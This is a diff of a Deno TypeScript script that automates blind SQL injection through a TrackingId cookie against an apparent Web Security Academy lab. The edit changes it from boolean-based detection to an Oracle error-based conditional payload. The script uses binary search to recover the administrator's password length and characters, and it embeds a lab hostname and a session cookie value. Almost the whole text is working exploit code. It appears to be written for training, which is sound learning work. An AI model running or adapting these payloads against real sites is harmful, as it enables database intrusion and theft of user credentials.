@@ -1,7 +1,7 @@
 import axios, { AxiosResponse } from "npm:axios@latest";
 
-const HOST = "DOMAIN_HERE";
-const SESSION = "SESSION_COOKIE_HERE";
+const HOST = "0a65000c0311b8fbc09b2744000d0047.web-security-academy.net";
+const SESSION = "VTun9PtR3gl6NgNbK8g2qd51kk09RdPl";
 
 function sleep(time: number): Promise<void> {
   return new Promise((resolve) => {
@@ -14,13 +14,17 @@ function sleep(time: number): Promise<void> {
 async function compareWithRemote(condition?: string) {
   await sleep(100);
   const query =
-    `' UNION SELECT password from users WHERE username = 'administrator' AND ${condition} --`;
-  const res = await axios.get(`https://${HOST}/`, {
-    headers: {
-      Cookie: `TrackingId=${query};Session=${SESSION}`,
-    },
-  });
-  return isTrue(res);
+    `' UNION SELECT CASE WHEN ((SELECT 'a' FROM users WHERE username = 'administrator' AND ${condition}) = 'a') THEN TO_CHAR(1/0) ELSE NULL END FROM dual --`;
+  try {
+    await axios.get(`https://${HOST}/`, {
+      headers: {
+        Cookie: `TrackingId=${query};Session=${SESSION}`,
+      },
+    });
+    return false;
+  } catch {
+    return true;
+  }
 }
 
 async function findLengthOfPassword(
@@ -28,6 +32,9 @@ async function findLengthOfPassword(
   lower: number,
 ): Promise<number> {
   const value = Math.floor((higher + lower) / 2);
+  await Deno.stdout.write(
+    new TextEncoder().encode(`Passwordlength is: ${value}\r`),
+  );
   if (value === lower || value === higher) {
     const isEqual = await compareWithRemote(`password = ${value}`);
     if (!isEqual) {
@@ -35,7 +42,6 @@ async function findLengthOfPassword(
     }
     return value;
   }
-  console.log(`LENTH(password) < ${value}`);
   const isLower = await compareWithRemote(`LENGTH(password) < ${value}`);
   if (isLower) {
     return findLengthOfPassword(value, lower);
@@ -79,31 +85,31 @@ async function findCharOfPassword(
   );
   if (value === lower || value === higher) {
     const isEqual = await compareWithRemote(
-      `SUBSTRING(password, ${index}, 1) = '${value}'`,
+      `SUBSTR(password, ${index}, 1) = '${value}'`,
     );
     if (!isEqual) {
-      throw new Error("Not the right character");
+        throw new Error("No possibilities");
     }
     return value;
   }
 
   // Don't know why it's > instead of < but Ig we'll roll with it
   const isLower = await compareWithRemote(
-    `SUBSTRING(password, ${index}, 1) > '${value}'`,
+    `SUBSTR(password, ${index}, 1) > '${value}'`,
   );
   if (isLower) {
     return findCharOfPassword(value, lower, index);
   }
 
   const isHigher = await compareWithRemote(
-    `SUBSTRING(password, ${index}, 1) < '${value}'`,
+    `SUBSTR(password, ${index}, 1) < '${value}'`,
   );
   if (isHigher) {
     return findCharOfPassword(higher, value, index);
   }
 
   const isEqual = await compareWithRemote(
-    `SUBSTRING(password, ${index}, 1) = '${value}'`,
+    `SUBSTR(password, ${index}, 1) = '${value}'`,
   );
   if (!isEqual) {
     throw new Error("No possibilities");
@@ -112,11 +118,12 @@ async function findCharOfPassword(
 }
 
 function isTrue(response: AxiosResponse<string>) {
-  return response.data.includes("<div>Welcome back!</div>");
+  Deno.writeFileSync("result.html", new TextEncoder().encode(response.data));
+  return response.data.includes('<p class="is-warning">');
 }
 
 const length = await findLengthOfPassword(100, 0);
-console.log(`Passwordlength is: ${length}`);
+Deno.stdout.writeSync(new TextEncoder().encode("\n"));
 const password = await findPassword(length);
 const passwordMatch = await compareWithRemote(`password = '${password}'`);
 if (!passwordMatch) {
